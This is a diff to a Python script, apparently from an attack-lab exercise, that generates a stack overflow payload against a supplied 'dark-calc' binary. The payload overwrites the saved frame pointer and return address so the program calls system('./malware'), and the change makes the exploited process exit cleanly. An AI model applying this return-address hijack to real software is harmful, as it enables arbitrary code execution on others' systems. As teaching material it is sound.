@@ -8,8 +8,9 @@ own `mov edi, <command_buf>; call system@plt` call site.  command_buf already
 holds "./malware" (input() just copied it there), so system("./malware") runs
 and attack/malware finds dark-calc among its ancestors.
 
-The one address we need is resolved from the binary at generation time, so no
-hardcoded constants remain.
+The code address is resolved from the supplied binary at generation time. The
+saved-rbp slot is derived from the fixed-stack top; the frame and command-buffer
+layout deliberately match the supplied dark-calc, not arbitrary rebuilt binaries.
 """
 import os
 import struct
@@ -24,8 +25,12 @@ ELF = attacklab.Elf(os.path.join(HERE, "attack", "dark-calc"))
 # eval()'s `mov edi, <command_buf>; call system@plt`  (0x401a6b in the shipped binary).
 SYSTEM_CALL_SITE = attacklab.system_command_buf_call_site(ELF)
 
+# __wrap_main calls main at fixed_stack_top-8, and main's saved-rbp slot is at
+# fixed_stack_top-0x10. input's leave restores rbp to that slot. eval's leave
+# then pops the caller frame and returns through the untouched wrapper return
+# address at fixed_stack_top-8, so system() returning leads to a clean exit.
+saved_rbp = struct.pack("<Q", attacklab.fixed_stack_top(ELF) - 0x10)
 padding = b"./malware\x00" + b"A" * 6   # 16 bytes: command string + filler
-saved_rbp = b"B" * 8                    # unused after `leave; ret`
 payload = padding + saved_rbp + struct.pack("<Q", SYSTEM_CALL_SITE) + b"\n"
 
 # dark-calc runs on a 48-byte fixed stack window (buffer .. PROT_NONE guard page).
